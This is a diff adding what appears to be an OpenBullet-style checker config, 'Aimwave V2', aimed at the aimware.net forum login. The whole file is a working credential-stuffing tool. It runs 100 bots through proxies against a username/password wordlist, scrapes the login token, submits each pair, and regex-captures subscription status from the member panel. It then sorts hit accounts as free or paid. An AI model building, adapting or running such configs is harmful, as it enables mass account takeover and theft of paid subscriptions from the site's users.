@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "Aimwave V2",
+  "SuggestedBots": 100,
+  "LastModified": "2018-10-10T06:45:01.9213741+00:00",
+  "AdditionalInfo": "",
+  "Author": "Kermit (Tx to SeaPound For Regex & Keycheck)",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://aimware.net/forum/member.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "my_post_key = \"" "\"" Recursive=FALSE -> VAR "POSTKEY" "" "" 
+REQUEST POST "https://aimware.net/forum/member.php" AutoRedirect=TRUE 
+  CONTENT "action=do_login&url=https%3A%2F%2Faimware.net%2Fforum%2F&quick_login=1&my_post_key=<POSTKEY>&quick_username=<USER>&quick_password=<PASS>&submit=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+REQUEST GET "https://aimware.net/forum/panel.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" REGEX "<td class=\\"trow1\\"><span class=\\"smalltext\\"><strong>([^\\"]*)<\/strong><\/span><\/td><td class=\\"trow1\\" align=\\"center\\"><span class=\\"smalltext\\"><span style=\\"color:[^\\"]*\\">([^\\"]*)<\/span><\/td>" "|=====| [2] |=====| [1] |=====|" Recursive=TRUE -> CAP "Capped" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "You have entered an invalid username/password combination." 
+    KEY "You are either not logged in or do not have permission to view this page" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Expired" 
+  KEYCHAIN Success OR 
+    KEY "Extend" 
